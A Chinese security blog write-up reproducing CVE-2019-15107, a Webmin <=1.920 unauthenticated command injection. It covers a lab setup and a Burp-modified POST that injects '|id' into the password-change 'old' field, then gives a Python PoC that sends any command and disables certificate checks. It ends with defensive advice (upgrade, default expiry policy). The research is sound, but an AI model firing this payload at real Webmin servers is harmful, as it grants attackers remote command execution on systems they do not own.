<article class="post">
  <h1>Webmin&lt;=1.920-Unauthenticated_RCE(CVE-2019-15107)利用测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2019年8月10日，Ozkan(@ehakkus)在DEFCON AppSec Village公开了一个0 day，1.930以下版本的Webmin存在远程代码执行漏洞，文章地址如下：</p>

<p>https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html</p>

<p>我对这个漏洞进行了跟踪研究，本文将要记录测试过程，根据漏洞原理使用Python编写一个POC，并给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>漏洞简介</li>
  <li>搭建测试环境</li>
  <li>使用Burp Suite复现漏洞</li>
  <li>使用Python编写POC</li>
</ul>

<h2 id="0x02-漏洞简介">0x02 漏洞简介</h2>
<hr>

<p>Webmin是基于Web的Unix系统管理工具，简单理解：使用Webmin能够通过浏览器远程管理Unix系统的主机</p>

<p>1.930以下版本的Webmin存在远程代码执行漏洞，当Webmin的<code class="language-plaintext highlighter-rouge">Password expiry policy</code>设置为<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>时(默认设置为<code class="language-plaintext highlighter-rouge">Always deny users with expired passwords</code>)，通过构造特殊格式的POST包，能够实现远程代码执行</p>

<h2 id="0x03-搭建测试环境和漏洞复现">0x03 搭建测试环境和漏洞复现</h2>
<hr>

<p>测试系统： Centos7 x64
IP：192.168.112.181</p>

<h3 id="1安装perl和依赖库">1.安装perl和依赖库</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>yum -y install perl
yum -y install perl-Net-SSLeay
yum -y install perl-Encode-Detect
</code></pre></div></div>

<h3 id="2下载并安装存在漏洞的webadmin1920">2.下载并安装存在漏洞的Webadmin(1.920)</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://sourceforge.net/projects/webadmin/files/webmin/1.920/webmin-1.920-1.noarch.rpm
rpm -U webmin-1.920-1.noarch.rpm
</code></pre></div></div>

<p>安装成功后Webadmin默认开启SSL</p>

<h3 id="3配置防火墙打开10000端口支持远程访问">3.配置防火墙，打开10000端口，支持远程访问</h3>

<p>添加10000端口：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --zone=public --add-port=10000/tcp --permanent
</code></pre></div></div>

<p>重启防火墙：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --reload
</code></pre></div></div>

<p>查看端口号是否开启：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firewall-cmd --query-port=10000/tcp
</code></pre></div></div>

<h3 id="4远程登录">4.远程登录</h3>

<p>https://192.168.112.181:10000</p>

<p>登录页面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-1.png" alt="Alt text"></p>

<p>使用Centos的root用户口令进行登录</p>

<p><strong>注：</strong></p>

<p>为了便于测试，可以先关闭SSL功能，位置为：<code class="language-plaintext highlighter-rouge">Webmin Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">SSL Encryption</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-2.png" alt="Alt text"></p>

<p>新的登录页面为http://192.168.112.181:10000</p>

<h3 id="5修改password-expiry-policy">5.修改Password expiry policy</h3>

<p>位置为：<code class="language-plaintext highlighter-rouge">Webmin Configuration</code> -&gt; <code class="language-plaintext highlighter-rouge">Authentication</code></p>

<p>默认为<code class="language-plaintext highlighter-rouge">Always deny users with expired passwords</code></p>

<p>修改为<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new on</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-3.png" alt="Alt text"></p>

<h3 id="6添加新用户">6.添加新用户</h3>

<p>位置为：<code class="language-plaintext highlighter-rouge">Webmin Users</code></p>

<p>添加用户成功后，修改Password选项，添加<code class="language-plaintext highlighter-rouge">Force change at next login</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-4.png" alt="Alt text"></p>

<h3 id="7使用新用户登录">7.使用新用户登录</h3>

<p>提示需要修改密码</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-5.png" alt="Alt text"></p>

<h3 id="8开启burp-suite进行抓包">8.开启Burp Suite进行抓包</h3>

<p>任意输入旧口令和新的口令</p>

<p>Burp Suite抓包如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-6.png" alt="Alt text"></p>

<p>正常的返回结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-7.png" alt="Alt text"></p>

<h3 id="9修改post包添加payload">9.修改POST包，添加Payload</h3>

<p>重复步骤8，并修改POST包</p>

<p>原数据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=a&amp;pam=&amp;expired=2&amp;old=123&amp;new1=456&amp;new2=456
</code></pre></div></div>

<p>新数据：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=a&amp;pam=&amp;expired=2&amp;old=123|id&amp;new1=456&amp;new2=456
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-8.png" alt="Alt text"></p>

<p>新的结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-9.png" alt="Alt text"></p>

<p>执行了命令(<code class="language-plaintext highlighter-rouge">id</code>)并输出结果</p>

<h2 id="0x04-使用python编写poc">0x04 使用Python编写POC</h2>
<hr>

<p>Ozkan(@ehakkus)在他的文章中使用ruby编写了POC，这里使用Python根据Burp Suite的抓包情况重写一个POC</p>

<p>需要考虑以下问题：</p>

<h3 id="1python使用requests发送post包">1.Python使用requests发送POST包</h3>

<p>POST包格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-8-16/2-6.png" alt="Alt text"></p>

<p>对应Python使用requests发送POST包的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
def test_post_http(ip,command):
    try:
        url = 'http://' + ip + ':10000/password_change.cgi'
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': "gzip, deflate",
            'Referer': 'http://' + ip + ':10000/session_login.cgi',
            'Cookie': 'redirect=1; testing=1; sid=x',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '47'
        } 
        payload = 'user=a&amp;pam=&amp;expired=2&amp;old=test|' + command + '&amp;new1=test1&amp;new2=test1'
        r = requests.post(url, data=payload, headers = headers)
    	print r.text
    except Exception as e:
            print '[!]Error:%s'%e
</code></pre></div></div>

<h3 id="2添加对结果的识别">2.添加对结果的识别</h3>

<p>如果Webmin未开启<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>，结果为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;Error - Perl execution failed&lt;/h1&gt;
&lt;p&gt;Password changing is not enabled! at /usr/libexec/webmin/password_change.cgi line 12.
&lt;/p&gt;
</code></pre></div></div>

<p>如果Webmin使用https，结果为:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;Error - Document follows&lt;/h1&gt;
&lt;pre&gt;This web server is running in SSL mode. Try the URL &lt;a href='https://webmin-node-reddis:10000/'&gt;https://webmin-node-reddis:10000/&lt;/a&gt; instead.&lt;br&gt;&lt;/pre&gt;
</code></pre></div></div>

<p>如果Webmin开启<code class="language-plaintext highlighter-rouge">Prompt users with expired passwords to enter a new one</code>，结果为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;hr&gt;
&lt;center&gt;&lt;h3&gt;Failed to change password : The current password is incorrect&lt;/h3&gt;&lt;/center&gt;
&lt;hr&gt;
</code></pre></div></div>

<h3 id="3添加对https的支持">3.添加对HTTPS的支持</h3>

<p>如果结果为<code class="language-plaintext highlighter-rouge">This web server is running in SSL mode.</code>，那么跳转到HTTPS再次测试</p>

<p>另外，需要取消证书验证</p>

<p>原代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = requests.post(url, data=payload, headers = headers)
</code></pre></div></div>

<p>新代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = requests.post(url, data=payload, headers = headers, verify = False)
</code></pre></div></div>

<p>取消证书的ssl-warning，添加代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import warnings
warnings.filterwarnings("ignore")
</code></pre></div></div>

<p>否则，会提示：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Python27\lib\site-packages\urllib3-1.25.3-py2.7.egg\urllib3\connectionpool.py:851: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: ttps://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings  InsecureRequestWarning)
</code></pre></div></div>

<p>完整测试代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Python/blob/master/Webmin%3C=1.920-Unauthenticated_RCE(CVE-2019-15107).py</p>

<h2 id="0x05-防御建议">0x05 防御建议</h2>
<hr>

<p>1.升级至1.930</p>

<p>2.<code class="language-plaintext highlighter-rouge">Password expiry policy</code>采用默认设置</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Webmin&lt;=1.920的远程代码执行进行测试，记录过程，根据漏洞原理使用Python编写一个POC，并给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August 16, 2019
  </div>

  
</article>